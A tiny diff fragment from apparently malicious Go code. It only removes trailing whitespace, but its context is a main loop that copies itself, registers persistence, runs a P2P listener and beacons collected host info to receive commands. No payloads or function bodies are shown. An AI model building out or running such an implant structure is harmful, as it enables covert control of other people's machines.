@@ -33,7 +33,7 @@ type HostInfo struct {
 func main() {
 	bootstrap()                     // copy self & register persistence
 	go startPeerListener()          // P2P
-	go persist()                    
+	go persist()
 	for {
 		info := collectInfo()
 		if cmds := beacon(info); len(cmds) > 0 {
